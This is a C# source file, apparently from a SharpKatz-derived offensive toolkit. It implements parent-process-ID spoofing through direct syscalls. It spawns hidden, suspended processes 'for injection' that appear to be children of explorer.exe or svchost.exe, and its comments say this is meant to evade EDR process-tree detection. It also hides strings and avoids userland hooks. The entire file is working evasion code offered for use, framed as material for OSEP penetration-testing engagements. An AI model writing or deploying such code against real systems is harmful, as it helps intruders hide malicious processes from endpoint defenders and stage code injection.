using System;
using System.Runtime.InteropServices;
using SharpKatz.Win32;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    /// <summary>
    /// Process creation with PPID Spoofing via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
    /// Makes the spawned process appear as a child of the chosen parent (e.g. explorer.exe, svchost.exe).
    /// Useful for evading EDR process-tree heuristics during OSEP engagements.
    /// All API calls go through dynamic resolution — no static DllImport.
    /// </summary>
    internal static class SpawnProcess
    {
        /// <summary>
        /// Create a process with a spoofed parent PID.
        /// The new process inherits the parent's desktop session and evades
        /// process-tree based detection by appearing under the specified parent.
        /// </summary>
        /// <param name="parentPid">PID of the process to use as fake parent (e.g. explorer.exe PID)</param>
        /// <param name="binary">Full path to the executable to launch</param>
        /// <param name="arguments">Command line arguments (can be empty)</param>
        /// <param name="suspended">If true, create the process in a suspended state (for injection)</param>
        /// <returns>PROCESS_INFORMATION of the created process, or default on failure</returns>
        public static PROCESS_INFORMATION CreateWithParentSpoof(int parentPid, string binary,
            string arguments = "", bool suspended = true)
        {
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // Open the parent process via syscall to get a handle
            IntPtr hParent = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID ci = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)parentPid,
                UniqueThread = IntPtr.Zero
            };

            NTSTATUS status = SysCall.ZwOpenProcess10(ref hParent,
                ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, oa, ref ci);

            if (status != NTSTATUS.Success || hParent == IntPtr.Zero)
            {
                Console.WriteLine("  Error: Cannot open parent process PID {0} (NTSTATUS: 0x{1:X8})",
                    parentPid, (uint)status);
                return pi;
            }

            IntPtr lpAttributeList = IntPtr.Zero;
            IntPtr lpParentValue = IntPtr.Zero;

            try
            {
                // Step 1: Get the size needed for the attribute list (1 attribute)
                IntPtr lpSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                // First call always fails with ERROR_INSUFFICIENT_BUFFER — that's expected

                if (lpSize == IntPtr.Zero)
                {
                    Console.WriteLine("  Error: InitializeProcThreadAttributeList size query failed");
                    return pi;
                }

                // Step 2: Allocate and initialize the attribute list
                lpAttributeList = Marshal.AllocHGlobal(lpSize);

                if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize))
                {
                    Console.WriteLine("  Error: InitializeProcThreadAttributeList failed");
                    return pi;
                }

                // Step 3: Set PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to our chosen parent
                lpParentValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpParentValue, hParent);

                if (!UpdateProcThreadAttribute(lpAttributeList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpParentValue, (IntPtr)IntPtr.Size,
                    IntPtr.Zero, IntPtr.Zero))
                {
                    Console.WriteLine("  Error: UpdateProcThreadAttribute failed");
                    return pi;
                }

                // Step 4: Set up STARTUPINFOEX with the attribute list
                STARTUPINFOEX siex = new STARTUPINFOEX();
                siex.StartupInfo.cb = (uint)Marshal.SizeOf(siex);
                siex.lpAttributeList = lpAttributeList;

                // Step 5: Build creation flags
                uint creationFlags = (uint)CreationFlags.EXTENDED_STARTUPINFO_PRESENT;
                if (suspended)
                    creationFlags |= (uint)CreationFlags.CREATE_SUSPENDED;
                creationFlags |= (uint)CreationFlags.CREATE_NO_WINDOW;

                // Step 6: Create the process
                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

                string commandLine = string.IsNullOrEmpty(arguments)
                    ? binary
                    : binary + " " + arguments;

                if (!Natives.CreateProcessW(null, commandLine,
                    ref pSec, ref tSec, false, creationFlags,
                    IntPtr.Zero, null, ref siex, out pi))
                {
                    Console.WriteLine("  Error: CreateProcessW failed (GetLastError may apply)");
                    return pi;
                }

                Console.WriteLine("  Process created with PPID spoofing:");
                Console.WriteLine("    PID     : {0}", pi.dwProcessId);
                Console.WriteLine("    TID     : {0}", pi.dwThreadId);
                Console.WriteLine("    Parent  : {0} (spoofed)", parentPid);
                Console.WriteLine("    Binary  : {0}", binary);
                Console.WriteLine("    State   : {0}", suspended ? "Suspended" : "Running");
            }
            catch (Exception ex)
            {
                Console.WriteLine("  Error: " + ex.Message);
            }
            finally
            {
                // Cleanup
                if (lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(lpAttributeList);
                    Marshal.FreeHGlobal(lpAttributeList);
                }
                if (lpParentValue != IntPtr.Zero)
                    Marshal.FreeHGlobal(lpParentValue);

                SysCall.ZwClose10(hParent);
            }

            return pi;
        }

        /// <summary>
        /// Find a suitable parent process for spoofing.
        /// Looks for common "trusted" processes like explorer.exe or svchost.exe.
        /// Uses syscall-based process enumeration to avoid userland hooks.
        /// </summary>
        /// <param name="targetName">Process name to find (without .exe), default "explorer"</param>
        /// <returns>PID of the found process, or -1 if not found</returns>
        public static int FindSpoofParent(string targetName = null)
        {
            if (string.IsNullOrEmpty(targetName))
            {
                // Default: explorer.exe — runs in user session, common parent for user processes
                targetName = new string(new char[] { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r' });
            }

            // Use syscall-based enumeration from Token module
            // Re-implement here to avoid circular dependency
            uint bufferSize = 1024 * 1024;
            IntPtr buffer = IntPtr.Zero;

            try
            {
                uint returnLength = 0;
                NTSTATUS status;

                do
                {
                    buffer = Marshal.AllocHGlobal((int)bufferSize);
                    status = SysCall.ZwQuerySystemInformation10(
                        SYSTEM_INFORMATION_CLASS.SystemProcessInformation,
                        buffer, bufferSize, ref returnLength);

                    if (status == NTSTATUS.InfoLengthMismatch || status == NTSTATUS.BufferTooSmall)
                    {
                        Marshal.FreeHGlobal(buffer);
                        buffer = IntPtr.Zero;
                        bufferSize = returnLength + 0x10000;
                    }
                } while (status == NTSTATUS.InfoLengthMismatch || status == NTSTATUS.BufferTooSmall);

                if (status != NTSTATUS.Success || buffer == IntPtr.Zero)
                    return -1;

                IntPtr currentEntry = buffer;
                while (true)
                {
                    SYSTEM_PROCESSES procInfo = (SYSTEM_PROCESSES)Marshal.PtrToStructure(
                        currentEntry, typeof(SYSTEM_PROCESSES));

                    if (procInfo.ImageName.Buffer != IntPtr.Zero && procInfo.ImageName.Length > 0)
                    {
                        string name = Marshal.PtrToStringUni(procInfo.ImageName.Buffer,
                            procInfo.ImageName.Length / 2);
                        if (name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                            name = name.Substring(0, name.Length - 4);

                        if (name.Equals(targetName, StringComparison.OrdinalIgnoreCase))
                            return procInfo.UniqueProcessId.ToInt32();
                    }

                    if (procInfo.NextEntryOffset == 0)
                        break;

                    currentEntry = (IntPtr)(currentEntry.ToInt64() + procInfo.NextEntryOffset);
                }
            }
            finally
            {
                if (buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(buffer);
            }

            return -1;
        }

        /// <summary>
        /// Convenience: create a process under explorer.exe (or another target) with PPID spoofing.
        /// Auto-finds the parent PID via syscall enumeration.
        /// </summary>
        public static PROCESS_INFORMATION SpawnUnderParent(string binary, string arguments = "",
            string parentName = null, bool suspended = true)
        {
            int parentPid = FindSpoofParent(parentName);
            if (parentPid <= 0)
            {
                string target = parentName ?? "explorer";
                Console.WriteLine("  Error: Could not find {0}.exe for PPID spoofing", target);
                return new PROCESS_INFORMATION();
            }

            Console.WriteLine("  Found parent: {0}.exe (PID {1})", parentName ?? "explorer", parentPid);
            return CreateWithParentSpoof(parentPid, binary, arguments, suspended);
        }
    }
}
